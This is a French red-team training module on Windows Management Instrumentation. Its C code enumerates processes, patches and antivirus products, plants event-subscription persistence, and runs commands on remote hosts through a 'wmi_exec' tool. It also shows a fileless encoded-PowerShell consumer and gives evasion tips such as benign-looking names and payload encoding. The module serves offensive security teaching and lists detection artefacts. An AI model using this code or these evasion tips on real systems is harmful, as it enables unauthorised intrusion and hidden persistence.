# WMI Basics - Windows Management Instrumentation

## Objectifs pédagogiques

À la fin de ce module, vous serez capable de :
- [ ] Comprendre l'architecture WMI et son rôle dans Windows
- [ ] Exécuter des requêtes WQL pour obtenir des informations système
- [ ] Créer des event consumers pour la persistence
- [ ] Utiliser WMI pour l'exécution de code à distance
- [ ] Identifier les techniques d'évasion et OPSEC liées à WMI

## Prérequis

Avant de commencer ce module, assurez-vous de maîtriser :
- Les bases du langage C (variables, fonctions, pointeurs)
- Les concepts de processus et threads Windows
- La manipulation de base du registre Windows
- Les APIs COM (Component Object Model) - notions de base

## Introduction

**Windows Management Instrumentation (WMI)** est une infrastructure puissante de Windows permettant de gérer, surveiller et automatiser des tâches administratives. Pour un attaquant, WMI est un outil précieux car il est **natif**, **légitime** et souvent **moins surveillé** que d'autres vecteurs d'attaque.

### Pourquoi WMI est important en Red Team ?

Imaginez WMI comme le **système nerveux de Windows** : il peut lire l'état de n'importe quel composant (processus, services, matériel) et peut également envoyer des commandes pour modifier cet état.

Pour un Red Team :
- **Reconnaissance** : Énumérer processus, services, utilisateurs, patches installés
- **Exécution latérale** : Lancer des processus sur des machines distantes
- **Persistence** : Créer des event subscriptions qui survivent aux redémarrages
- **Évasion** : Utiliser un canal légitime qui génère moins d'alertes que PsExec

## Concepts fondamentaux

### Concept 1 : Architecture WMI

WMI est organisé en plusieurs couches :

```
┌─────────────────────────────────────────────────────────────┐
│                    APPLICATIONS                              │
│          (PowerShell, WMIC, C/C++ via COM)                   │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│                  WMI Infrastructure                          │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │   CIM Object │  │  WMI Service │  │   WMI Event  │      │
│  │   Manager    │  │  (WinMgmt)   │  │   System     │      │
│  └──────────────┘  └──────────────┘  └──────────────┘      │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│                    WMI Providers                             │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │   Registry   │  │   Event Log  │  │    Win32     │      │
│  │   Provider   │  │   Provider   │  │   Provider   │      │
│  └──────────────┘  └──────────────┘  └──────────────┘      │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│            MANAGED RESOURCES                                 │
│      (Registre, Fichiers, Processus, Services...)           │
└─────────────────────────────────────────────────────────────┘
```

**Composants clés** :
- **CIM Repository** : Base de données stockant les classes WMI (dans `C:\Windows\System32\wbem\Repository\`)
- **WMI Service** (winmgmt) : Service Windows qui gère toutes les requêtes WMI
- **Providers** : DLLs qui interagissent avec les ressources système réelles
- **Namespaces** : Regroupements logiques de classes (ex: `root\cimv2`, `root\subscription`)

### Concept 2 : Namespaces et Classes WMI

WMI organise ses données en **namespaces** (comme des dossiers) contenant des **classes** (comme des fichiers).

```
root\
├── cimv2                  (Classes système principales)
│   ├── Win32_Process
│   ├── Win32_Service
│   ├── Win32_ComputerSystem
│   └── Win32_OperatingSystem
│
├── subscription           (Event consumers pour persistence)
│   ├── __EventFilter
│   ├── __EventConsumer
│   └── __FilterToConsumerBinding
│
├── SecurityCenter2        (Antivirus, Firewall status)
│   └── AntiVirusProduct
│
└── default                (Namespace par défaut)
```

**Classes importantes pour Red Team** :
- `Win32_Process` : Créer/terminer des processus
- `Win32_Service` : Manipuler des services
- `Win32_Product` : Lister logiciels installés (patches, AV)
- `Win32_NetworkAdapterConfiguration` : Configuration réseau
- `AntiVirusProduct` : Détection des antivirus installés

### Concept 3 : WQL (WMI Query Language)

WQL est un dialecte de SQL pour interroger WMI :

```sql
-- Syntaxe basique
SELECT <propriétés> FROM <classe> WHERE <condition>

-- Exemples
SELECT * FROM Win32_Process
SELECT Name, ProcessId FROM Win32_Process WHERE Name = 'explorer.exe'
SELECT * FROM Win32_Service WHERE State = 'Running'
```

### Concept 4 : WMI Events

WMI peut surveiller des événements système et déclencher des actions :

```
┌──────────────────┐       ┌──────────────────┐       ┌──────────────────┐
│   Event Filter   │──────▶│  Filter-Consumer │──────▶│  Event Consumer  │
│ (Quand surveiller│       │     Binding      │       │ (Quoi exécuter)  │
│   quel event?)   │       │  (Lien logique)  │       │                  │
└──────────────────┘       └──────────────────┘       └──────────────────┘
      (WHEN)                      (LINK)                     (ACTION)

Exemple :
  Event Filter: "Un utilisateur se connecte"
  Binding: Lien entre le filtre et le consumer
  Event Consumer: "Exécuter calc.exe"
```

## Mise en pratique

### Étape 1 : Initialisation COM et connexion WMI

WMI utilise COM (Component Object Model). Voici comment s'y connecter :

```c
#include <windows.h>
#include <wbemidl.h>
#include <stdio.h>

#pragma comment(lib, "wbemuuid.lib")

int main() {
    HRESULT hr;

    // 1. Initialiser COM
    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        printf("[-] CoInitializeEx failed: 0x%X\n", hr);
        return 1;
    }

    // 2. Définir les paramètres de sécurité COM
    hr = CoInitializeSecurity(
        NULL,                        // Security descriptor
        -1,                          // COM authentication
        NULL,                        // Authentication services
        NULL,                        // Reserved
        RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication
        RPC_C_IMP_LEVEL_IMPERSONATE, // Default impersonation
        NULL,                        // Authentication info
        EOAC_NONE,                   // Additional capabilities
        NULL                         // Reserved
    );

    // 3. Créer une instance de WbemLocator
    IWbemLocator *pLoc = NULL;
    hr = CoCreateInstance(
        &CLSID_WbemLocator,
        0,
        CLSCTX_INPROC_SERVER,
        &IID_IWbemLocator,
        (LPVOID *)&pLoc
    );

    if (FAILED(hr)) {
        printf("[-] Failed to create IWbemLocator: 0x%X\n", hr);
        CoUninitialize();
        return 1;
    }

    // 4. Se connecter au namespace WMI
    IWbemServices *pSvc = NULL;
    hr = pLoc->lpVtbl->ConnectServer(
        pLoc,
        L"ROOT\\CIMV2",              // Namespace
        NULL,                        // User (NULL = current user)
        NULL,                        // Password
        NULL,                        // Locale
        0,                           // Flags
        NULL,                        // Authority
        NULL,                        // Context
        &pSvc
    );

    if (FAILED(hr)) {
        printf("[-] ConnectServer failed: 0x%X\n", hr);
        pLoc->lpVtbl->Release(pLoc);
        CoUninitialize();
        return 1;
    }

    printf("[+] Connected to WMI namespace ROOT\\CIMV2\n");

    // 5. Définir les proxies de sécurité
    hr = CoSetProxyBlanket(
        (IUnknown *)pSvc,
        RPC_C_AUTHN_WINNT,
        RPC_C_AUTHZ_NONE,
        NULL,
        RPC_C_AUTHN_LEVEL_CALL,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE
    );

    // ... utiliser pSvc pour les requêtes ...

    // Nettoyage
    pSvc->lpVtbl->Release(pSvc);
    pLoc->lpVtbl->Release(pLoc);
    CoUninitialize();

    return 0;
}
```

**Explication détaillée** :
1. `CoInitializeEx` : Initialise la bibliothèque COM (obligatoire avant toute opération COM)
2. `CoInitializeSecurity` : Définit les niveaux de sécurité pour les appels COM
3. `CoCreateInstance` : Crée l'objet `WbemLocator` qui permet de se connecter à WMI
4. `ConnectServer` : Établit la connexion au namespace WMI souhaité
5. `CoSetProxyBlanket` : Configure l'authentification pour les appels distants

### Étape 2 : Exécuter une requête WQL

Une fois connecté, on peut interroger WMI avec WQL :

```c
// Fonction pour exécuter une requête WQL
void ExecuteWQLQuery(IWbemServices *pSvc, const wchar_t *query) {
    HRESULT hr;
    IEnumWbemClassObject *pEnumerator = NULL;

    // Exécuter la requête
    hr = pSvc->lpVtbl->ExecQuery(
        pSvc,
        L"WQL",                      // Langage de requête
        (BSTR)query,                 // Requête WQL
        WBEM_FLAG_FORWARD_ONLY |     // Optimisation : lecture avant uniquement
        WBEM_FLAG_RETURN_IMMEDIATELY,
        NULL,
        &pEnumerator
    );

    if (FAILED(hr)) {
        printf("[-] Query failed: 0x%X\n", hr);
        return;
    }

    // Itérer sur les résultats
    IWbemClassObject *pclsObj = NULL;
    ULONG uReturn = 0;

    while (pEnumerator) {
        hr = pEnumerator->lpVtbl->Next(
            pEnumerator,
            WBEM_INFINITE,           // Timeout
            1,                       // Nombre d'objets à récupérer
            &pclsObj,
            &uReturn
        );

        if (uReturn == 0) break;

        // Récupérer une propriété (exemple: Name)
        VARIANT vtProp;
        hr = pclsObj->lpVtbl->Get(
            pclsObj,
            L"Name",                 // Propriété à récupérer
            0,
            &vtProp,
            0,
            0
        );

        if (SUCCEEDED(hr)) {
            wprintf(L"[+] Name: %s\n", vtProp.bstrVal);
            VariantClear(&vtProp);
        }

        pclsObj->lpVtbl->Release(pclsObj);
    }

    pEnumerator->lpVtbl->Release(pEnumerator);
}

// Utilisation
ExecuteWQLQuery(pSvc, L"SELECT * FROM Win32_Process WHERE Name = 'explorer.exe'");
```

### Étape 3 : Énumération de processus avec WMI

Exemple complet pour lister tous les processus :

```c
#include <windows.h>
#include <wbemidl.h>
#include <stdio.h>

#pragma comment(lib, "wbemuuid.lib")

void EnumerateProcesses(IWbemServices *pSvc) {
    IEnumWbemClassObject *pEnum = NULL;
    HRESULT hr = pSvc->lpVtbl->ExecQuery(
        pSvc,
        L"WQL",
        L"SELECT ProcessId, Name, CommandLine, ParentProcessId FROM Win32_Process",
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        NULL,
        &pEnum
    );

    if (FAILED(hr)) {
        printf("[-] Query failed\n");
        return;
    }

    printf("\n%-8s %-8s %-30s %s\n", "PID", "PPID", "Name", "CommandLine");
    printf("================================================================================\n");

    IWbemClassObject *pObj = NULL;
    ULONG uReturn = 0;

    while (pEnum) {
        hr = pEnum->lpVtbl->Next(pEnum, WBEM_INFINITE, 1, &pObj, &uReturn);
        if (uReturn == 0) break;

        VARIANT vtPid, vtName, vtCmd, vtPpid;

        pObj->lpVtbl->Get(pObj, L"ProcessId", 0, &vtPid, 0, 0);
        pObj->lpVtbl->Get(pObj, L"Name", 0, &vtName, 0, 0);
        pObj->lpVtbl->Get(pObj, L"CommandLine", 0, &vtCmd, 0, 0);
        pObj->lpVtbl->Get(pObj, L"ParentProcessId", 0, &vtPpid, 0, 0);

        wprintf(L"%-8lu %-8lu %-30s %s\n",
            vtPid.ulVal,
            vtPpid.ulVal,
            vtName.bstrVal,
            (vtCmd.vt == VT_NULL) ? L"N/A" : vtCmd.bstrVal
        );

        VariantClear(&vtPid);
        VariantClear(&vtName);
        VariantClear(&vtCmd);
        VariantClear(&vtPpid);

        pObj->lpVtbl->Release(pObj);
    }

    pEnum->lpVtbl->Release(pEnum);
}
```

### Étape 4 : Exécution de processus avec WMI

WMI peut créer des processus via la méthode `Create` de `Win32_Process` :

```c
DWORD WMIExecuteProcess(IWbemServices *pSvc, const wchar_t *cmdline) {
    HRESULT hr;
    IWbemClassObject *pClass = NULL;
    IWbemClassObject *pInParams = NULL;
    IWbemClassObject *pOutParams = NULL;

    // 1. Obtenir la classe Win32_Process
    hr = pSvc->lpVtbl->GetObject(
        pSvc,
        L"Win32_Process",
        0,
        NULL,
        &pClass,
        NULL
    );

    if (FAILED(hr)) {
        printf("[-] GetObject failed: 0x%X\n", hr);
        return 0;
    }

    // 2. Obtenir la méthode "Create"
    hr = pClass->lpVtbl->GetMethod(
        pClass,
        L"Create",
        0,
        &pInParams,
        NULL
    );

    if (FAILED(hr)) {
        printf("[-] GetMethod failed: 0x%X\n", hr);
        pClass->lpVtbl->Release(pClass);
        return 0;
    }

    // 3. Spawn une instance des paramètres
    IWbemClassObject *pInParamsInstance = NULL;
    hr = pInParams->lpVtbl->SpawnInstance(pInParams, 0, &pInParamsInstance);

    // 4. Définir la commandline
    VARIANT varCmd;
    VariantInit(&varCmd);
    varCmd.vt = VT_BSTR;
    varCmd.bstrVal = SysAllocString(cmdline);

    hr = pInParamsInstance->lpVtbl->Put(
        pInParamsInstance,
        L"CommandLine",
        0,
        &varCmd,
        0
    );

    VariantClear(&varCmd);

    // 5. Exécuter la méthode
    hr = pSvc->lpVtbl->ExecMethod(
        pSvc,
        L"Win32_Process",
        L"Create",
        0,
        NULL,
        pInParamsInstance,
        &pOutParams,
        NULL
    );

    if (FAILED(hr)) {
        printf("[-] ExecMethod failed: 0x%X\n", hr);
        pInParamsInstance->lpVtbl->Release(pInParamsInstance);
        pInParams->lpVtbl->Release(pInParams);
        pClass->lpVtbl->Release(pClass);
        return 0;
    }

    // 6. Récupérer le PID du processus créé
    VARIANT varPid;
    hr = pOutParams->lpVtbl->Get(pOutParams, L"ProcessId", 0, &varPid, 0, 0);

    DWORD pid = 0;
    if (SUCCEEDED(hr)) {
        pid = varPid.ulVal;
        printf("[+] Process created with PID: %lu\n", pid);
        VariantClear(&varPid);
    }

    // Nettoyage
    pOutParams->lpVtbl->Release(pOutParams);
    pInParamsInstance->lpVtbl->Release(pInParamsInstance);
    pInParams->lpVtbl->Release(pInParams);
    pClass->lpVtbl->Release(pClass);

    return pid;
}

// Utilisation
WMIExecuteProcess(pSvc, L"cmd.exe /c whoami > C:\\temp\\output.txt");
```

### Étape 5 : WMI Event Subscription pour persistence

Les **Event Subscriptions** WMI permettent de créer des triggers persistants :

```c
// Structure d'un Event Subscription
//
// 1. Event Filter (Quand déclencher)
// 2. Event Consumer (Quoi exécuter)
// 3. Filter-to-Consumer Binding (Lier les deux)

void CreateWMIPersistence(IWbemServices *pSvc) {
    HRESULT hr;

    // ========== 1. EVENT FILTER ==========
    // Déclencher toutes les 60 secondes
    const wchar_t *filterQuery = L"SELECT * FROM __InstanceModificationEvent "
                                  L"WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";

    IWbemClassObject *pFilterClass = NULL;
    hr = pSvc->lpVtbl->GetObject(pSvc, L"__EventFilter", 0, NULL, &pFilterClass, NULL);

    IWbemClassObject *pFilterInstance = NULL;
    pFilterClass->lpVtbl->SpawnInstance(pFilterClass, 0, &pFilterInstance);

    VARIANT varName, varQuery, varQueryLang;
    VariantInit(&varName);
    VariantInit(&varQuery);
    VariantInit(&varQueryLang);

    varName.vt = VT_BSTR;
    varName.bstrVal = SysAllocString(L"PersistenceFilter");

    varQuery.vt = VT_BSTR;
    varQuery.bstrVal = SysAllocString(filterQuery);

    varQueryLang.vt = VT_BSTR;
    varQueryLang.bstrVal = SysAllocString(L"WQL");

    pFilterInstance->lpVtbl->Put(pFilterInstance, L"Name", 0, &varName, 0);
    pFilterInstance->lpVtbl->Put(pFilterInstance, L"EventNamespace", 0, &varQueryLang, 0);
    pFilterInstance->lpVtbl->Put(pFilterInstance, L"QueryLanguage", 0, &varQueryLang, 0);
    pFilterInstance->lpVtbl->Put(pFilterInstance, L"Query", 0, &varQuery, 0);

    // Sauvegarder le filtre
    hr = pSvc->lpVtbl->PutInstance(pSvc, pFilterInstance,
                                    WBEM_FLAG_CREATE_OR_UPDATE,
                                    NULL, NULL);

    if (SUCCEEDED(hr)) {
        printf("[+] Event Filter created\n");
    }

    VariantClear(&varName);
    VariantClear(&varQuery);
    VariantClear(&varQueryLang);

    // ========== 2. EVENT CONSUMER ==========
    // Exécuter une commande
    IWbemClassObject *pConsumerClass = NULL;
    hr = pSvc->lpVtbl->GetObject(pSvc, L"CommandLineEventConsumer", 0, NULL, &pConsumerClass, NULL);

    IWbemClassObject *pConsumerInstance = NULL;
    pConsumerClass->lpVtbl->SpawnInstance(pConsumerClass, 0, &pConsumerInstance);

    VARIANT varConsumerName, varCmd;
    VariantInit(&varConsumerName);
    VariantInit(&varCmd);

    varConsumerName.vt = VT_BSTR;
    varConsumerName.bstrVal = SysAllocString(L"PersistenceConsumer");

    varCmd.vt = VT_BSTR;
    varCmd.bstrVal = SysAllocString(L"cmd.exe /c calc.exe");  // Payload

    pConsumerInstance->lpVtbl->Put(pConsumerInstance, L"Name", 0, &varConsumerName, 0);
    pConsumerInstance->lpVtbl->Put(pConsumerInstance, L"CommandLineTemplate", 0, &varCmd, 0);

    hr = pSvc->lpVtbl->PutInstance(pSvc, pConsumerInstance,
                                    WBEM_FLAG_CREATE_OR_UPDATE,
                                    NULL, NULL);

    if (SUCCEEDED(hr)) {
        printf("[+] Event Consumer created\n");
    }

    VariantClear(&varConsumerName);
    VariantClear(&varCmd);

    // ========== 3. BINDING ==========
    IWbemClassObject *pBindingClass = NULL;
    hr = pSvc->lpVtbl->GetObject(pSvc, L"__FilterToConsumerBinding", 0, NULL, &pBindingClass, NULL);

    IWbemClassObject *pBindingInstance = NULL;
    pBindingClass->lpVtbl->SpawnInstance(pBindingClass, 0, &pBindingInstance);

    VARIANT varFilter, varConsumer;
    VariantInit(&varFilter);
    VariantInit(&varConsumer);

    varFilter.vt = VT_BSTR;
    varFilter.bstrVal = SysAllocString(L"__EventFilter.Name=\"PersistenceFilter\"");

    varConsumer.vt = VT_BSTR;
    varConsumer.bstrVal = SysAllocString(L"CommandLineEventConsumer.Name=\"PersistenceConsumer\"");

    pBindingInstance->lpVtbl->Put(pBindingInstance, L"Filter", 0, &varFilter, 0);
    pBindingInstance->lpVtbl->Put(pBindingInstance, L"Consumer", 0, &varConsumer, 0);

    hr = pSvc->lpVtbl->PutInstance(pSvc, pBindingInstance,
                                    WBEM_FLAG_CREATE_OR_UPDATE,
                                    NULL, NULL);

    if (SUCCEEDED(hr)) {
        printf("[+] Filter-to-Consumer Binding created\n");
        printf("[+] WMI persistence established!\n");
    }

    VariantClear(&varFilter);
    VariantClear(&varConsumer);

    // Nettoyage
    pBindingInstance->lpVtbl->Release(pBindingInstance);
    pBindingClass->lpVtbl->Release(pBindingClass);
    pConsumerInstance->lpVtbl->Release(pConsumerInstance);
    pConsumerClass->lpVtbl->Release(pConsumerClass);
    pFilterInstance->lpVtbl->Release(pFilterInstance);
    pFilterClass->lpVtbl->Release(pFilterClass);
}
```

**Vérification** :
```powershell
# Lister les Event Filters
Get-WMIObject -Namespace root\Subscription -Class __EventFilter

# Lister les Consumers
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer

# Lister les Bindings
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```

### Étape 6 : Exécution WMI à distance

WMI supporte l'exécution de commandes sur des machines distantes :

```c
IWbemServices* ConnectRemoteWMI(const wchar_t *host, const wchar_t *user, const wchar_t *pass) {
    HRESULT hr;
    IWbemLocator *pLoc = NULL;
    IWbemServices *pSvc = NULL;

    CoInitializeEx(0, COINIT_MULTITHREADED);
    CoInitializeSecurity(NULL, -1, NULL, NULL,
                         RPC_C_AUTHN_LEVEL_DEFAULT,
                         RPC_C_IMP_LEVEL_IMPERSONATE,
                         NULL, EOAC_NONE, NULL);

    hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
                          &IID_IWbemLocator, (LPVOID *)&pLoc);

    if (FAILED(hr)) return NULL;

    // Construction du chemin: \\host\root\cimv2
    wchar_t path[256];
    swprintf(path, 256, L"\\\\%s\\root\\cimv2", host);

    // Créer les credentials
    COAUTHIDENTITY authIdent;
    authIdent.User = (USHORT*)user;
    authIdent.UserLength = wcslen(user);
    authIdent.Password = (USHORT*)pass;
    authIdent.PasswordLength = wcslen(pass);
    authIdent.Domain = NULL;
    authIdent.DomainLength = 0;
    authIdent.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

    hr = pLoc->lpVtbl->ConnectServer(
        pLoc,
        path,                        // Chemin réseau
        (BSTR)user,                  // Username
        (BSTR)pass,                  // Password
        NULL,
        0,
        NULL,
        NULL,
        &pSvc
    );

    if (FAILED(hr)) {
        printf("[-] Remote connection failed: 0x%X\n", hr);
        pLoc->lpVtbl->Release(pLoc);
        return NULL;
    }

    // Définir les proxies pour la connexion distante
    hr = CoSetProxyBlanket(
        (IUnknown *)pSvc,
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        &authIdent,
        EOAC_NONE
    );

    printf("[+] Connected to remote WMI: %S\n", host);

    pLoc->lpVtbl->Release(pLoc);
    return pSvc;
}

// Utilisation
IWbemServices *pRemoteSvc = ConnectRemoteWMI(
    L"192.168.1.100",
    L"Administrator",
    L"P@ssw0rd123"
);

if (pRemoteSvc) {
    WMIExecuteProcess(pRemoteSvc, L"cmd.exe /c whoami > C:\\temp\\pwned.txt");
    pRemoteSvc->lpVtbl->Release(pRemoteSvc);
}
```

## Application offensive

### Contexte Red Team

WMI est un vecteur d'attaque privilégié en Red Team pour plusieurs raisons :

**1. Reconnaissance passive**
```c
// Détecter les antivirus installés
void DetectAntivirus(IWbemServices *pSvc) {
    IEnumWbemClassObject *pEnum = NULL;
    HRESULT hr = pSvc->lpVtbl->ExecQuery(
        pSvc, L"WQL",
        L"SELECT * FROM AntiVirusProduct",
        WBEM_FLAG_FORWARD_ONLY, NULL, &pEnum
    );

    // NOTE: Nécessite le namespace root\SecurityCenter2
}

// Lister les patches de sécurité
void EnumeratePatches(IWbemServices *pSvc) {
    ExecuteWQLQuery(pSvc, L"SELECT HotFixID, InstalledOn FROM Win32_QuickFixEngineering");
}

// Identifier les comptes locaux
void EnumerateUsers(IWbemServices *pSvc) {
    ExecuteWQLQuery(pSvc, L"SELECT Name, SID FROM Win32_UserAccount WHERE LocalAccount = True");
}
```

**2. Lateral Movement**

WMI peut remplacer PsExec pour l'exécution latérale :

```
┌─────────────────┐                    ┌─────────────────┐
│  Attacker Box   │                    │  Target Server  │
│  192.168.1.50   │                    │  192.168.1.100  │
└────────┬────────┘                    └────────┬────────┘
         │                                      │
         │  1. WMI Connection (port 135)        │
         │─────────────────────────────────────▶│
         │                                      │
         │  2. DCOM negotiation (RPC)           │
         │◀─────────────────────────────────────│
         │                                      │
         │  3. Win32_Process.Create()           │
         │─────────────────────────────────────▶│
         │     "cmd.exe /c payload.exe"         │
         │                                      │
         │  4. Process spawned                  │
         │◀─────────────────────────────────────│
         │     Return: PID                      │
         │                                      │
```

**3. Persistence discrète**

Les Event Subscriptions WMI sont moins connues que les clés de registre Run :

```c
// Types d'Event Consumers disponibles:
// - CommandLineEventConsumer : Exécuter une commande
// - ActiveScriptEventConsumer : Exécuter VBScript/JScript
// - LogFileEventConsumer : Écrire dans un fichier log
// - SMTPEventConsumer : Envoyer un email

// Exemple: Déclencher sur ouverture de session
const wchar_t *loginTrigger =
    L"SELECT * FROM __InstanceCreationEvent WITHIN 15 "
    L"WHERE TargetInstance ISA 'Win32_LogonSession' AND "
    L"TargetInstance.LogonType = 2";  // Interactive logon
```

**4. Fileless execution**

WMI peut exécuter du code sans écrire sur disque :

```c
// ActiveScriptEventConsumer avec payload VBScript encodé
const wchar_t *vbsPayload =
    L"Set objShell = CreateObject(\"WScript.Shell\")\n"
    L"objShell.Run \"powershell.exe -enc <BASE64_PAYLOAD>\", 0, False";
```

### Considérations OPSEC

**Détection et évasion** :

1. **Logs générés** :
   - Event ID 5861 (WMI Activity)
   - Event ID 4688 (Process Creation via WMI)
   - Sysmon Event ID 19/20/21 (WMI Event Subscriptions)

2. **Artefacts forensiques** :
   ```
   C:\Windows\System32\wbem\Repository\OBJECTS.DATA
   - Contient toutes les subscriptions WMI
   - Analysable avec outils forensiques (Velociraptor, KAPE)
   ```

3. **Techniques d'évasion** :

```c
// A. Nettoyer les subscriptions après usage
void RemoveWMIPersistence(IWbemServices *pSvc) {
    // Supprimer le binding
    pSvc->lpVtbl->DeleteInstance(pSvc,
        L"__FilterToConsumerBinding.Filter=\"__EventFilter.Name='PersistenceFilter'\","
        L"Consumer=\"CommandLineEventConsumer.Name='PersistenceConsumer'\"",
        0, NULL, NULL);

    // Supprimer le consumer
    pSvc->lpVtbl->DeleteInstance(pSvc,
        L"CommandLineEventConsumer.Name='PersistenceConsumer'",
        0, NULL, NULL);

    // Supprimer le filter
    pSvc->lpVtbl->DeleteInstance(pSvc,
        L"__EventFilter.Name='PersistenceFilter'",
        0, NULL, NULL);
}

// B. Utiliser des noms génériques pour blending
// MAUVAIS: "EvilBackdoor", "MalwareFilter"
// BON: "SystemMonitor", "WindowsUpdateCheck"

// C. Limiter la fréquence d'exécution
// MAUVAIS: WITHIN 5 (trop fréquent, suspect)
// BON: WITHIN 3600 (1 fois par heure)

// D. Encoder les payloads
// Utiliser Base64, XOR, ou obfuscation VBScript/PowerShell
```

4. **Détection EDR/AV** :

Les EDR modernes surveillent :
- Création d'event subscriptions (namespace `root\subscription`)
- Exécution de `Win32_Process.Create()`
- Connexions WMI distantes inhabituelles
- Utilisation de `CommandLineEventConsumer`

**Alternatives plus furtives** :
- Utiliser `ActiveScriptEventConsumer` avec du code obfusqué
- Combiner avec d'autres techniques (DLL hijacking + WMI trigger)
- Utiliser WMI uniquement pour la reconnaissance, pas l'exécution

### Outil Red Team : WMI Command Executor

```c
// wmi_exec.c - Simple WMI remote executor
#include <windows.h>
#include <wbemidl.h>
#include <stdio.h>

#pragma comment(lib, "wbemuuid.lib")

void Usage() {
    printf("Usage: wmi_exec.exe <host> <user> <pass> <command>\n");
    printf("Example: wmi_exec.exe 192.168.1.100 admin P@ss123 \"cmd /c whoami\"\n");
}

int wmain(int argc, wchar_t *argv[]) {
    if (argc < 5) {
        Usage();
        return 1;
    }

    const wchar_t *host = argv[1];
    const wchar_t *user = argv[2];
    const wchar_t *pass = argv[3];
    const wchar_t *cmd = argv[4];

    printf("[*] Target: %S\n", host);
    printf("[*] Command: %S\n", cmd);

    IWbemServices *pSvc = ConnectRemoteWMI(host, user, pass);
    if (!pSvc) {
        printf("[-] Connection failed\n");
        return 1;
    }

    DWORD pid = WMIExecuteProcess(pSvc, cmd);
    if (pid) {
        printf("[+] Success! PID: %lu\n", pid);
    } else {
        printf("[-] Execution failed\n");
    }

    pSvc->lpVtbl->Release(pSvc);
    CoUninitialize();

    return 0;
}
```

**Compilation** :
```bash
cl.exe wmi_exec.c /link ole32.lib oleaut32.lib wbemuuid.lib
```

## Résumé

- **WMI** est une infrastructure puissante de gestion Windows, exploitable en Red Team
- **Architecture** : Namespaces → Classes → Propriétés/Méthodes
- **Requêtes WQL** : Similaire à SQL pour interroger le système
- **Event Subscriptions** : Mécanisme de persistence discret (Filter + Consumer + Binding)
- **Exécution distante** : Alternative à PsExec via `Win32_Process.Create()`
- **OPSEC** : Surveiller les logs WMI, nettoyer les artefacts, encoder les payloads
- **Détection** : EDR surveillent les subscriptions et l'exécution de processus WMI

## Ressources complémentaires

- [Microsoft WMI Documentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/)
- [MITRE ATT&CK T1047 - WMI Execution](https://attack.mitre.org/techniques/T1047/)
- [WMI Offense, Defense, and Forensics - FireEye](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf)
- [Abusing Windows Management Instrumentation - Black Hat](https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf)
- [PowerSploit WMI Module](https://github.com/PowerShellMafia/PowerSploit/blob/master/Persistence/Persistence.psm1)

---

**Navigation**
- [Module précédent](../05-Services/)
- [Module suivant](../07-Reseau-Winsock/)
